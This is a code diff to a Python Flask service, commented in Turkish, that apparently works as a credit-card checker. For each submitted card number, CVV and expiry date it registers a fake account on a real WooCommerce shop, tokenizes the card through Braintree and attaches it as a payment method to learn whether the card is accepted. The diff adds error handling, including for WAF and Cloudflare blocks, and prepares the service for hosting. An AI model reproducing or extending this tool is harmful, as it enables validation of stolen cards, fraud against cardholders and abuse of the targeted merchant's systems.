@@ -24,7 +24,7 @@ def tokenize_payment():
             "message": "Eksik parametre! Örn: /tokenize?number=...&cvv=...&exp_month=...&exp_year=..."
         }), 400
 
-    # 2. RASTGELE KİMLİK VE SESSION ÜRETİMİ
+    # 2. SESSİON VE KİMLİK AYARLARI
     f = Faker()
     e = f.email()
     n = f.name()
@@ -32,7 +32,7 @@ def tokenize_payment():
     r = requests.Session()
 
     try:
-        # --- ADIM 1: WOOCOMMERCE HESAP SAYFASI & NONCE ÇEKME ---
+        # --- ADIM 1: WOOCOMMERCE HESAP SAYFASI & NONCE ---
         response = r.get('https://www.dnalasering.com/my-account/', headers={'User-Agent': u}, timeout=15)
         x = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', response.text)
         xp = x.group(1) if x else ''
@@ -56,7 +56,7 @@ def tokenize_payment():
             'user-agent': u,
         }, data=register_data, timeout=15)
 
-        # --- ADIM 2: ADRES BİLGİLERİNİ KAYDETME ---
+        # --- ADIM 2: ADRES GÜNCELLEME ---
         response = r.get('https://www.dnalasering.com/my-account/edit-address/billing/', headers={'User-Agent': u}, timeout=15)
         xxl = re.search(r'name="woocommerce-edit-address-nonce" value="([^"]+)"', response.text)
         xxp = xxl.group(1) if xxl else ''
@@ -95,6 +95,9 @@ def tokenize_payment():
             wwp = re.search(r'client_token_nonce\\u0022:\\u0022([^"]+)\\u0022', site.text)
         xpython = wwp.group(1) if wwp else ''
 
+        if not xpython:
+            return jsonify({"status": "error", "message": "Sayfadan client_token_nonce değeri ayıklanamadı. Site mimarisi değişmiş veya bot engeli olabilir."}), 500
+
         ajax_data = {
             'action': 'wc_braintree_credit_card_get_client_token',
             'nonce': xpython,
@@ -107,15 +110,30 @@ def tokenize_payment():
             'Referer': 'https://www.dnalasering.com/my-account/add-payment-method/',
         }, data=ajax_data, timeout=15)
 
-        # Base64 Çözümleme ve Parmak İzi Alma
-        ajax_json = ajax_resp.json()
+        # JSON Çözümleme Hatasını Engelleme Kontrolü
+        if ajax_resp.status_code != 200:
+            return jsonify({
+                "status": "error", 
+                "message": f"Admin-ajax isteği başarısız oldu. Durum Kodu: {ajax_resp.status_code}",
+                "html_preview": ajax_resp.text[:300]
+            }), 400
+
+        try:
+            ajax_json = ajax_resp.json()
+        except json.JSONDecodeError:
+            return jsonify({
+                "status": "error",
+                "message": "Hedef sunucu JSON yerine geçersiz veri döndü (Büyük ihtimalle Cloudflare/WAF engeli).",
+                "response_text": ajax_resp.text[:500]
+            }), 500
+
         if 'data' not in ajax_json:
-            return jsonify({"status": "error", "message": "Client token verisi alınamadı."}), 500
+            return jsonify({"status": "error", "message": "Admin-ajax yanıtı 'data' anahtarını içermiyor.", "details": ajax_json}), 500
 
         decoded = base64.b64decode(ajax_json['data']).decode('utf-8')
         auth_fingerprint = json.loads(decoded).get('authorizationFingerprint')
 
-        # --- ADIM 4: BRAINTREE GRAPHQL KART TOKENLEŞTİRME ---
+        # --- ADIM 4: BRAINTREE GRAPHQL TOKENİZASYON ---
         json_graphql = {
             'clientSdkMetadata': {'source': 'client', 'integration': 'custom'},
             'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }',
@@ -139,18 +157,21 @@ def tokenize_payment():
             'braintree-version': '2018-05-10',
             'content-type': 'application/json',
             'origin': 'https://assets.braintreegateway.com',
-            'referer': 'https://assets.assets.braintreegateway.com/',
+            'referer': 'https://assets.braintreegateway.com/',
             'user-agent': u,
         }, json=json_graphql, timeout=15)
 
-        graphql_data = response_graphql.json()
-        
+        try:
+            graphql_data = response_graphql.json()
+        except json.JSONDecodeError:
+            return jsonify({"status": "error", "message": "Braintree GraphQL geçersiz yanıt döndü.", "response_text": response_graphql.text[:300]}), 500
+
         if 'errors' in graphql_data:
-            return jsonify({"status": "error", "message": "GraphQL Hatası", "details": graphql_data['errors']}), 400
+            return jsonify({"status": "error", "message": "Braintree GraphQL hatası.", "details": graphql_data['errors']}), 400
             
         braintree_token = graphql_data['data']['tokenizeCreditCard']['token']
 
-        # --- ADIM 5: METODU HESABA EKLEME & SONUÇ AYRIŞTIRMA ---
+        # --- ADIM 5: METODU HESABA EKLEME ---
         final_data = [
             ('payment_method', 'braintree_credit_card'),
             ('wc-braintree-credit-card-card-type', 'visa'),
@@ -171,25 +192,25 @@ def tokenize_payment():
             'user-agent': u,
         }, data=final_data, timeout=15)
 
-        # Siteden dönen woocommerce hata veya başarı mesajlarını yakalama
+        # Sonuç yakalama
         wx = re.search(r'<ul class="woocommerce-error"[^>]*>(.*?)</ul>', response_final.text, re.DOTALL)
         if wx:
             msg = re.sub(r'<[^>]+>', '', wx.group(1)).strip()
         else:
-            msg = "İşlem tamamlandı veya doğrudan hata dönmedi."
+            msg = "İşlem tamamlandı veya doğrudan bir hata listelenmedi."
 
         return jsonify({
-            "developer": "c4rdable",
+            "status": "success",
             "gateway": "Braintree Custom Integration",
+            "token": braintree_token,
             "response": msg
         })
 
     except requests.exceptions.Timeout:
-        return jsonify({"status": "error", "message": "Hedef site yanıt vermedi (Zaman aşımı)."}), 504
+        return jsonify({"status": "error", "message": "Hedef site zaman aşımına uğradı (Timeout)."}), 504
     except Exception as err:
         return jsonify({"status": "error", "message": f"Sistemsel Hata: {str(err)}"}), 500
 
 if __name__ == '__main__':
-    # Render port yönetimini otomatik algılaması için os.environ kullanıldı.
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port)
